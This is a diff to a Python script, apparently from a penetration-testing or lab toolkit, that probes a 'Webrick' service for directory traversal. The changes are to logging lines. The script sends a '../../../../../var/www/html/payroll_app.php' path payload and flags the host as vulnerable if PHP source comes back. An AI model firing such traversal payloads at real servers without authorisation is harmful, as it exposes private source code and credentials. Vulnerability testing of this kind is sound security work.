@@ -4,6 +4,7 @@ import requests
 import argparse
 
 import logging
+
 log = logging.getLogger(__name__)
 
 """ Dir Traversal http://10.0.28.14:3500/readme?os=../../../../../var/www/html/payroll_app.php
@@ -24,12 +25,12 @@ class Webrick:
         self.__path = "/readme?os=../../../../../var/www/html/payroll_app.php"
 
     def __exploit(self):
-        log.debug("[!] In exploit")
-        r  = requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
+        log.debug(f"[!] Start Webrick exploit ({self.__host})")
+        r = requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
         if "<?php" in r.text or "my mysqli(" in r.text:
-            log.info("[!] Webrick is vulnerable")
+            log.info(f"[!] Webrick is vulnerable ({self.__host})")
             return True
-        log.info("[!] Webrick is secure")
+        log.info(f"[!] Webrick is secure ({self.__host})")
         return False
 
     def run(self, host, port=None):
